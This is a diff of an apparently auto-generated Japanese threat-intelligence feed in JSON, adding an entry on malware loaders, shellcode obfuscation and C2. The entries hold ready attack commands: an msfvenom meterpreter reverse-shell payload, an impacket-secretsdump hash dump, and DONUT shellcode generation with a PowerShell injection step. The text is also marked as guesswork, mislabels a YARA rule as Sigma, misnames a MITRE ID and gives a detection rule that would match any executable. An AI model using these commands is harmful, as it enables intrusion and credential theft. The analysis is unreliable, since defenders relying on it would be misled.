@@ -15,5 +15,23 @@
     ],
     "content": "## 概要\nマルウェアのローダー機構を悪用した攻撃について説明する。\n\n## 脆弱性・脅威の技術的メカニズム\nマルウェアのローダー機構は、[推測]DLLハIJACKINGやDLL Search Order Hijackingを使用して、正当なプロセスにマルウェアをロードすることができる。\n難読化アルゴリズムは、[推測]NOP命令の挿入やPEヘッダの改ざんを使用して、マルウェアの検知を回避する。\nC2通信プロトコルは、[推測]HTTPSやDNSを使用して、C2サーバーとの通信を実現する。\n\n## 攻撃シナリオ（ステップバイステップ）\n1. マルウェアのローダー機構を悪用して、正当なプロセスにマルウェアをロードする。\n2. 難読化アルゴリズムを使用して、マルウェアの検知を回避する。\n3. C2通信プロトコルを使用して、C2サーバーとの通信を実現する。\n4. 永続化レジストリキーを使用して、マルウェアの永続化を実現する。\n\n## 実行コマンド\n```bash\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe\n```\n```bash\nimpacket-secretsdump -just-dc-ntlm DOMAIN/user:password@192.168.1.10 -outputfile hashes.txt\n```\n\n## MITRE ATT&CK マッピング\nT1059.001: Command and Scripting Interpreter\n\n## 検知シグネチャ・緩和策\nSigmaルール:\n```yara\nrule Malware_Loader_Mechanism\n{\n  meta:\n    description = \"マルウェアのローダー機構の検知\"\n  strings:\n    $a = \"MZ\"\n  condition:\n    $a at 0\n}\n```",
     "url": "https://github.com/mawg0ud/InvisMalware"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "MALWARE",
+    "title": "マルウェアのローダー機構解析",
+    "summary_points": [
+      "PowerShell ステージでの暗号化シェルコードの注入",
+      "DONUT による position-independent シェルコードの生成",
+      "C2 通信プロトコルの使用"
+    ],
+    "poc_url": "",
+    "cvss_score": "",
+    "mitre_ids": [
+      "T1059.001",
+      "T1027.002"
+    ],
+    "content": "## 概要\nマルウェアのローダー機構、難読化アルゴリズム、C2 通信プロトコル、永続化レジストリキーについて解析する。\n\n## 脆弱性・脅威の技術的メカニズム\nマルウェアは PowerShell ステージで XOR 操作を使用してシェルコードを暗号化し、DONUT によって生成された position-independent シェルコードを使用して .NET アセンブリや PE ファイルをメモリからロードする。さらに、仮想化、サンドボックス、エミュレーション検出チェックを実行し、プロセスインジェクションとメモリ操作の試行を継続的に監視する。\n\n## 攻撃シナリオ（ステップバイステップ）\n1. マルウェアのローダー機構を解析し、DONUT によって生成されたシェルコードを抽出する。\n2. 抽出されたシェルコードを使用して、.NET アセンブリや PE ファイルをメモリからロードする。\n3. 仮想化、サンドボックス、エミュレーション検出チェックを回避する。\n4. プロセスインジェクションとメモリ操作の試行を継続的に監視する。\n\n## 実行コマンド\n```bash\n# DONUT を使用して position-independent シェルコードを生成する\nDONUT -f payload.dll -o shellcode.bin\n\n# PowerShell を使用してシェルコードを注入する\npowershell -ExecutionPolicy Bypass -File inject.ps1\n```\n\n## MITRE ATT&CK マッピング\nT1059.001: Command and Scripting Interpreter\nT1027.002: Virtualization/Sandbox Evasion\n\n## 検知シグネチャ・緩和策\nSigma ルールを使用して、マルウェアのローダー機構と DONUT によるシェルコードの生成を検知する。\n```yara\nrule Malware_Loader {\n  meta:\n    description = \"マルウェアのローダー機構検知\"\n  strings:\n    $s1 = { 8B ?? ?? ?? ?? 8B ?? ?? ?? ?? }\n  condition:\n    $s1\n}\n```",
+    "url": "https://www.pointwild.com/threat-intelligence/when-malware-talks-back/"
   }
 ]
